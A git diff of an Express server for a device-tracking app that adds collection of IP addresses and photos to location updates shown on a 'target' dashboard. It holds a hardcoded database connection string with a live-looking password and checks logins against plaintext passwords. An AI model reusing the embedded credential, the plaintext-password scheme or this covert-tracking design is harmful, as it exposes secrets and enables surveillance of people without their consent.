@@ -11,16 +11,15 @@ const app = express();
 const PORT = process.env.PORT || 10000;
 
 app.use(cors());
-app.use(express.json());
+// IMPORTANT FIX: Photo badi hoti hai, isliye limit 10MB karni padi
+app.use(express.json({ limit: '10mb' }));
 app.use(express.static(path.join(__dirname, 'frontend')));
 
-// 1. DATABASE CONNECTION
 const mongoURI = process.env.MONGO_URI || "mongodb+srv://priyanshurajthakur5634_db_user:6SO3JcNKgDLWjwhm@cluster0.yb3flx7.mongodb.net/SecureTraceDB?retryWrites=true&w=majority"; 
 mongoose.connect(mongoURI)
     .then(() => console.log("[+] DATABASE CONNECTED SUCCESSFULLY!"))
     .catch(err => console.log("[-] DATABASE CONNECTION FAILED:", err));
 
-// 2. USER REGISTRATION
 app.post('/api/register', async (req, res) => {
     try {
         const { username, password, deviceId } = req.body;
@@ -30,39 +29,29 @@ app.post('/api/register', async (req, res) => {
         const newUser = new User({ username, password, deviceId });
         await newUser.save();
         res.json({ success: true, message: "Account created successfully!" });
-    } catch (error) {
-        res.status(500).json({ success: false, message: "Server Error" });
-    }
+    } catch (error) { res.status(500).json({ success: false, message: "Server Error" }); }
 });
 
-// 3. USER LOGIN
 app.post('/api/login', async (req, res) => {
     try {
         const { username, password } = req.body;
         const user = await User.findOne({ username, password });
-        if (user) {
-            res.json({ success: true, deviceId: user.deviceId });
-        } else {
-            res.status(401).json({ success: false, message: "Invalid Credentials!" });
-        }
-    } catch (error) {
-        res.status(500).json({ success: false, message: "Server Error" });
-    }
+        if (user) res.json({ success: true, deviceId: user.deviceId });
+        else res.status(401).json({ success: false, message: "Invalid Credentials!" });
+    } catch (error) { res.status(500).json({ success: false, message: "Server Error" }); }
 });
 
-// 4. RECEIVE LOCATION & DEVICE INFO
+// NAYA: IP aur Photo receive karna
 app.post('/api/update-location', async (req, res) => {
     try {
-        const { deviceId, lat, lng, accuracy, battery, network } = req.body;
-        const newLocation = new Location({ deviceId, latitude: lat, longitude: lng, accuracy, battery, network });
+        const { deviceId, lat, lng, accuracy, battery, network, ipAddress, photoUrl } = req.body;
+        const newLocation = new Location({ deviceId, latitude: lat, longitude: lng, accuracy, battery, network, ipAddress, photoUrl });
         await newLocation.save();
-        res.json({ success: true, message: "Location & Status updated." });
-    } catch (error) {
-        res.status(500).json({ success: false, message: "DB Error!" });
-    }
+        res.json({ success: true, message: "Location & Intel updated." });
+    } catch (error) { res.status(500).json({ success: false, message: "DB Error!" }); }
 });
 
-// 5. SEND DATA TO DASHBOARD
+// NAYA: Dashboard ko IP aur Photo bhejna
 app.post('/api/get-location', async (req, res) => {
     try {
         const { deviceId } = req.body;
@@ -74,14 +63,14 @@ app.post('/api/get-location', async (req, res) => {
                 accuracy: parseFloat(latestLocation.accuracy),
                 battery: latestLocation.battery || "Unknown",
                 network: latestLocation.network || "Unknown",
+                ipAddress: latestLocation.ipAddress || "Detecting...",
+                photoUrl: latestLocation.photoUrl || "",
                 status: "LIVE TRACKING ACTIVE"
             });
         } else {
             res.json({ status: "TARGET OFFLINE" });
         }
-    } catch (error) {
-        res.status(500).json({ status: "ERROR" });
-    }
+    } catch (error) { res.status(500).json({ status: "ERROR" }); }
 });
 
 app.use((req, res) => {
